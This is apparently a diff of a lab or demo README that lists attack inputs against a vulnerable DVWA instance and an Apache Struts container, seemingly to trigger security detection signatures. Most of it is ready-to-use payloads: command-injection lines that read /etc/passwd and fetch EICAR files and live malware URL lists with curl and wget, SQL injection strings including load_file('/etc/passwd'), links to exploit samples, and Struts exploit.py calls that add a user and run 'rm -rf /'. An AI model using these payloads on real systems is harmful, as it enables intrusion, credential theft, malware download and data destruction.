@@ -1,15 +1,60 @@
-This interface can be used to execute remote command execution using the docker image "andrefernandes86/demo-apachestruts-target" as a target.
-.
-Starting the Vulnerable Container
-docker run -d --rm -p 80:8080 andrefernandes86/demo-apachestruts-target </h2>
-.
-Examples of commands that can be executed.. </h2>
-.
+## Examples
+- DVWA - http://labs.aflabs.us:8090
+
+-- Command Injection > Executing Remote Code and Forcing the Server to Download Known Malware
+127.0.0.1| cat /etc/passwd 
+127.0.0.1| ls
+127.0.0.1| curl http://www.google.com/cmd.exe
+127.0.0.1| curl http://malware.wicar.org/data/eicar.com > virus.com
+127.0.0.1| wget http://malware.wicar.org/data/eicar.com
+127.0.0.1| ls
+
+-- Command Injection > 0-day malware detection
+127.0.0.1| curl http://vxvault.net/URL_List.php
+127.0.0.1| curl http://vxvault.net/URL_List.php > urls.txt
+127.0.0.1| ls
+127.0.0.1| cat urls.txt
+127.0.0.1| wget -i urls.txt --tries=1 --timeout=5
+
+-- SQL Injection Attacks
+#SQL Injection Attack (ID 5670)
+SELECT First_Name,Last_Name FROM users WHERE ID=’1ʹ;
+SELECT First_Name,Last_Name FROM users WHERE ID=a’ OR ”=’;
+SELECT First_Name,Last_Name FROM users WHERE ID=’ ‘ order by 1 #
+
+#SQL Injection Attack (ID 19769)
+Select version() and Select @@version
+‘ union select @@version#
+‘ union select 1,@@version#
+
+#SQL Injection Attack (ID 3593)
+‘ union select null,@@hostname #
+‘ union all select system_user(),user() #
+‘ union all select load_file(‘/etc/passwd’),null #
+
+-- File Upload
+#EICAR (ID 16893)
+http://labs.aflabs.us:8090/samples/eicar.com
+
+#Exploit: Shellcode Payload (ID 3990) - Download these files and upload it into the webapp
+http://labs.aflabs.us:8090/samples/tp_samples/ms03_020_ie_objecttype.html
+
+#HTTP: Shell.Application ActiveX Control Execution (ID 3775)
+http://labs.aflabs.us:8090/samples/tp_samples/ms14_064_ole_xp.html
+
+#HTTP: Microsoft Internet Explorer Remote Code Execution Vulnerability (ID 9893)
+http://labs.aflabs.us:8090/samples/tp_samples/ms09_072_style_object.html
+
+#HTTP: Obfuscated HTML Usage (ID 23799)
+http://labs.aflabs.us:8090/samples/tp_samples/ms05_054_onload.html
+
+#Apache Struts - Command Injection Attack
 127.0.0.1| python http://target-ip/hello "command"
-127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
-127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
-127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
-127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
-127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
-127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
-127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "ls -la"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "cat /etc/passwd"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "wget http://2016.eicar.org/download/eicar.com"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "curl http://wrs21.winshipway.com/"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "adduser CaptainCaveman"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "cat /etc/passwd"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "ls -la"
+127.0.0.1| python exploit.py http://192.168.40.12/hello "rm -rf /"
